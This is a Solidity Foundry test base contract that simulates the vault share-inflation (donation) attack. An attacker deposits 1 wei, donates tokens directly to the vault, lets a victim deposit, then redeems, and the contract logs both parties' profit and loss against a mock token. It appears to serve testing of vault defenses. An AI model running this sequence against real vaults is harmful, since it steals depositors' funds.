// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockToken} from "../../src/MockToken.sol";

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

/// The same four-step attack against any vault that exposes deposit/redeem:
///   1. attacker deposits 1 wei
///   2. attacker transfers DONATION straight to the vault (no shares minted)
///   3. victim deposits `victimDeposit`
///   4. attacker redeems everything they hold
abstract contract AttackBase is Test {
    uint256 internal constant DONATION = 10_000e18;
    uint256 internal constant VICTIM_DEPOSIT = 9_000e18;
    uint256 internal constant ATTACKER_BUDGET = DONATION + 1;

    MockToken internal token;
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal deployer = makeAddr("deployer");

    struct Result {
        uint256 victimShares;
        uint256 victimValue;
        uint256 attackerOut;
        int256 attackerProfit;
        int256 victimPnl;
    }

    function setUp() public virtual {
        token = new MockToken();
        token.mint(attacker, ATTACKER_BUDGET);
        token.mint(victim, 20_000e18);
        token.mint(deployer, 1e18);
    }

    function _attack(IVault vault, uint256 victimDeposit) internal returns (Result memory r) {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), DONATION);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        r.victimShares = vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        vm.startPrank(attacker);
        r.attackerOut = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        vm.stopPrank();

        if (r.victimShares > 0) {
            vm.prank(victim);
            r.victimValue = vault.redeem(r.victimShares, victim, victim);
        }
        r.attackerProfit = int256(r.attackerOut) - int256(ATTACKER_BUDGET);
        r.victimPnl = int256(r.victimValue) - int256(victimDeposit);
    }

    function _log(string memory name, Result memory r) internal pure {
        console2.log("----", name);
        console2.log("victim shares         ", r.victimShares);
        console2.log("victim value out (wei)", r.victimValue);
        console2.log("victim pnl (wei)      ", r.victimPnl);
        console2.log("attacker out (wei)    ", r.attackerOut);
        console2.log("attacker profit (wei) ", r.attackerProfit);
    }
}
